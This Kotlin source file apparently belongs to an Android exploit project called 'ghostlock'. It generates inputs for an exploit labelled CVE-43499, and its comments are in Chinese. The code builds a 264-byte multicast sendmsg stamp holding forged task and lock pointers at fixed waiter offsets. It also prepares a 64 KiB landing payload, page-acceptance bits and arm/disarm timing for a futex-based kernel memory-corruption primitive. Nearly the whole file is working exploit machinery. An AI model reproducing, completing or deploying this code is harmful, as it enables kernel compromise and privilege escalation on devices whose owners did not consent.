package com.ghostlock.app.backend.cve43499.generator

import com.ghostlock.app.backend.cve43499.flow.Cve43499GeneratedInputs
import com.ghostlock.app.backend.cve43499.flow.Cve43499PostPlacementGenerator
import com.ghostlock.app.backend.cve43499.lifecycle.Cve43499PlacementFacts
import com.ghostlock.app.jni.Native43499MulticastSpec
import com.ghostlock.app.jni.Native43499PrimitiveSpec

/**
 * multicast 输入 generator（R3b）：由 placement facts 生成 264B stamp、
 * 64 KiB landing bytes、三地址与页接受参数。
 *
 * 数据来源（只读参考）：
 * - stamp 布局：profile `route[0].multicast_waiter`（waiter_off=96/task_offset=48/
 *   lock_offset=56/buffer_size=264）+ legacy `route_multicast.cpp:76-91`
 *   （family 在偏移 8 写 `AF_UNSPEC`，task@waiter+48、lock@waiter+56）；
 * - 地址：legacy2 `support.cpp:425-438`（payload_base=base+skb_data_delta，
 *   fake_lock=payload_base+LOCK_OFF，fake_task=payload_base+FAKE_TASK_OFF；
 *   本机布局下 fake_lock==base、fake_task==base+0x400）；
 * - 页接受判据：legacy2 `memory.cpp:210-227`（W1 zero+preserve_child 时
 *   `layout.right=base+0x100`，第 16 位必须为 1）。
 *
 * @param context generator 上下文（目标事实 + 执行参数 + 本进程 pid）。
 * @note 纯函数；不触 Native、不持有 token。阶段：R3b；真机未验证。
 */
internal class Cve43499MulticastInputGenerator(
    private val context: Cve43499GeneratorContext,
) : Cve43499PostPlacementGenerator, Cve43499WriteGenerator {
    /**
     * 生成 W1 landing + multicast PrimitiveSpec（R3b 兼容入口）。
     *
     * @param facts Placement 事务回传的只读物理事实。
     * @return Flow 使用的生成输入。
     */
    override fun generate(facts: Cve43499PlacementFacts): Cve43499GeneratedInputs =
        generateForWrite(facts, context.w1WriteRequest())

    /**
     * 生成指定写请求的 landing + multicast PrimitiveSpec（R3d 多写链）。
     *
     * @param facts Placement 事务回传的只读物理事实。
     * @param request 本事务写请求（target/mode/preserve_child）。
     * @return Flow 使用的生成输入。
     * @throws Cve43499GeneratorException 事实/配置非法（fail-closed）。
     */
    override fun generateForWrite(
        facts: Cve43499PlacementFacts,
        request: Cve43499WriteRequest,
    ): Cve43499GeneratedInputs {
        val generator = context.debug.generator
        val payload = Cve43499PayloadBuilder.build(
            facts = facts,
            context = context,
            tcpLayout = false,
            request = request,
        )
        val pageAccept = pageAcceptParameters(
            request = request,
            writeValueOffset = generator.payload.writeValueOffset,
            pageAcceptBit = generator.payload.pageAcceptBit,
        )
        val stamp = buildStamp(payload)
        val spec = Native43499MulticastSpec(
            finalWaiterAddress = payload.fakeW0,
            finalTaskAddress = payload.fakeTask,
            finalLockAddress = payload.fakeLock,
            frameBytes = stamp,
            socketBufferSize = context.execution.multicastSocketBufferSize,
            operationBudget = context.execution.multicastOperationBudget,
            timeoutNanos = context.execution.multicastTimeoutNanos,
            addressFamily = context.execution.multicastAddressFamily,
            armHoldNs = context.execution.multicastArmHoldNs,
            armSequence = context.execution.multicastArmSequence,
            maxFrame = generator.multicast.frameSize,
            ghostPid = context.ghostPid,
            futexWaiterFlag = generator.multicast.futexWaiterFlag,
            disarmRequired = generator.multicast.disarmRequired,
            primitiveKind = Native43499PrimitiveSpec.KIND_MULTICAST_SENDMSG,
        )
        return Cve43499GeneratedInputs(
            landing = context.landingConfig(payload.bytes, pageAccept),
            primitive = spec,
        )
    }

    /**
     * 构造 264B multicast stamp。
     *
     * @param payload landing payload 派生结果（取 fake_task/fake_lock 最终地址）。
     * @return stamp 字节（长度=配置 frame_size；未写字节为 0）。
     * @throws Cve43499GeneratorException 几何不一致（buffer_size≠frame_size/负偏移）。
     */
    private fun buildStamp(payload: Cve43499PayloadResult): ByteArray {
        val route = context.debug.route
        val multicast = context.debug.generator.multicast
        if (multicast.frameSize <= 0L || multicast.frameSize > Int.MAX_VALUE.toLong()) {
            throw Cve43499GeneratorException("multicast:frame-size")
        }
        if (route.bufferSize.toLong() != multicast.frameSize) {
            /* profile 的 buffer_size 与 generator 段 frame_size 必须同源，冲突即拒绝。 */
            throw Cve43499GeneratorException("multicast:buffer-size-mismatch")
        }
        if (route.waiterOff < 0 || route.taskOffset < 0 || route.lockOffset < 0) {
            throw Cve43499GeneratorException("multicast:waiter-geometry")
        }
        if (multicast.familyOffset < 0L || multicast.familyOffset > multicast.frameSize - 2L) {
            throw Cve43499GeneratorException("multicast:family-offset")
        }
        if (multicast.stampFamily !in 0..0xffff) {
            throw Cve43499GeneratorException("multicast:stamp-family")
        }
        val stamp = Cve43499LeWriter(ByteArray(multicast.frameSize.toInt()))
        /* legacy 顺序：先 encode waiter（task/lock），再写 family；字节结果与顺序无关。 */
        stamp.putU64(
            route.waiterOff.toLong() + route.taskOffset.toLong(),
            payload.fakeTask,
        )
        stamp.putU64(
            route.waiterOff.toLong() + route.lockOffset.toLong(),
            payload.fakeLock,
        )
        stamp.putU16(multicast.familyOffset, multicast.stampFamily)
        return stamp.bytesView()
    }
}
